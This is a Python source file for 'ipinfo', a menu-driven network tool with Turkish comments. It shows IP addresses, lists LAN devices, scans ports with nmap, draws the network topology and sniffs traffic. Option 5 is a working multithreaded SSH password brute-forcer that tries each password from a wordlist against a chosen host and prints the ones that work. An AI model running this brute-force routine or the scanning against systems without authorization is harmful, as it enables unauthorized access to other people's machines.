import socket
import requests
import subprocess
import nmap
import matplotlib.pyplot as plt
import networkx as nx
import paramiko
from concurrent.futures import ThreadPoolExecutor
from scapy.all import sniff

# Bannerı göster
def display_banner():
    banner = """
 ___   ____     ___   _   _   _____    ___ 
|_ _|  |  _ \  |_ _| | \ | | |  ___|  / _ \ 
 | |   | |_) |  | |  |  \| | | |_    | | | |
 | |   |  __/   | |  | |\  | |  _|   | |_| |
|___|  |_|     |___| |_| \_| |_|      \___/
           
    """
    print(banner)
    print("Welcome to ipinfo - Your simple network information tool\n")

# Menüyü göster
def display_menu():
    menu = """
    Please choose an option:
    1. Display local and public IP addresses
    2. Scan devices and their information on the local network
    3. Scan ports on a target IP address
    4. Display network topology
    5. Brute force SSH on a target device
    6. Monitor network traffic
    7. Exit
    """
    print(menu)

# Yerel IP adresini al
def get_local_ip():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        return local_ip
    except Exception as e:
        return f"Error: {e}"

# Genel IP adresini al
def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        public_ip = response.json()['origin']
        return public_ip
    except Exception as e:
        return f"Error: {e}"

# Yerel ağdaki cihazları tara
def scan_local_devices():
    try:
        arp_output = subprocess.check_output(['arp', '-a']).decode('utf-8')
        
        devices = []
        for line in arp_output.splitlines():
            if 'ether' in line.lower():
                parts = line.split()
                ip = parts[1].strip('()')
                mac_address = parts[3]
                hostname = parts[0]
                vendor = "Unknown"  # Vendor bilgisi ARP tablosundan alınamaz, geçici olarak Unknown atanmıştır.
                
                device_info = {
                    'hostname': hostname,
                    'ip': ip,
                    'mac_address': mac_address,
                    'vendor': vendor
                }
                devices.append(device_info)
        
        return devices
    except Exception as e:
        print(f"Error scanning local devices: {e}")
        return []

# Port taraması yap
def scan_ports(ip, start_port, end_port):
    try:
        nm = nmap.PortScanner()
        scan_range = f"{start_port}-{end_port}"
        nm.scan(ip, arguments=f"-p {scan_range}")
        open_ports = []
        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                for proto in nm[host].all_protocols():
                    lport = nm[host][proto].keys()
                    for port in lport:
                        if nm[host][proto][port]['state'] == 'open':
                            open_ports.append(port)
        return open_ports
    except Exception as e:
        print(f"Error scanning ports: {e}")
        return []

# Ağ topolojisini görüntüle
def display_network_topology(devices):
    try:
        if not devices:
            print("No devices found on the local network.")
            return
        
        G = nx.Graph()

        local_ip = get_local_ip()
        G.add_node(local_ip, label="Local Host")

        for device in devices:
            label = f"{device['ip']}\n{device['mac_address']}"
            G.add_node(device['ip'], label=label)
            G.add_edge(local_ip, device['ip'])

        pos = nx.spring_layout(G)
        labels = nx.get_node_attributes(G, 'label')
        nx.draw(G, pos, with_labels=True, labels=labels, node_size=3000, node_color='lightblue', font_size=10, font_weight='bold')
        plt.title("Network Topology")
        plt.show()

    except Exception as e:
        print(f"Error displaying network topology: {e}")

# SSH brute force saldırısı yap
def ssh_brute_force(ip, username, password_file):
    def attempt_ssh(ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)
            print(f"Success: {username}@{ip} with password: {password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            print(f"Error: {e}")
            return False

    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(attempt_ssh, ip, username, password) for password in passwords]
        for future in futures:
            if future.result():
                break

# Ağ trafiğini izle ve yazdır
def monitor_network_traffic():
    def packet_callback(packet):
        print(packet.summary())

    print("Starting network traffic monitoring... (Press Ctrl+C to stop)")
    sniff(prn=packet_callback, store=False)

# Ana fonksiyon
def main():
    display_banner()  # Başlangıç banner'ını göster

    devices = []  # Global bir değişken olarak cihazları tut

    while True:
        display_menu()  # Menüyü göster
        choice = input("Enter your choice: ")

        if choice == "1":
            local_ip = get_local_ip()
            public_ip = get_public_ip()
            print(f"Local IP address: {local_ip}")
            print(f"Public IP address: {public_ip}")

        elif choice == "2":
            devices = scan_local_devices()
            if devices:
                print("Devices found on the local network:")
                for idx, device in enumerate(devices, start=1):
                    print(f"Device {idx}:")
                    print(f"  Hostname: {device['hostname']}")
                    print(f"  IP Address: {device['ip']}")
                    print(f"  MAC Address: {device['mac_address']}")
                    print(f"  Vendor: {device['vendor']}")
                    print("")
            else:
                print("No devices found on the local network.")

        elif choice == "3":
            target_ip = input("Enter the target IP address: ")
            start_port = int(input("Enter the starting port number: "))
            end_port = int(input("Enter the ending port number: "))

            print(f"Scanning {target_ip} from port {start_port} to {end_port}...")
            open_ports = scan_ports(target_ip, start_port, end_port)

            if open_ports:
                print(f"Open ports on {target_ip}: {', '.join(map(str, open_ports))}")
            else:
                print(f"No open ports found on {target_ip} in the range {start_port}-{end_port}.")

        elif choice == "4":
            display_network_topology(devices)

        elif choice == "5":
            target_ip = input("Enter the target IP address for SSH brute force: ")
            username = input("Enter the SSH username: ")
            password_file = input("Enter the path to the password file: ")
            ssh_brute_force(target_ip, username, password_file)

        elif choice == "6":
            monitor_network_traffic()

        elif choice == "7":
            print("Exiting ipinfo. Goodbye!")
            break

        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
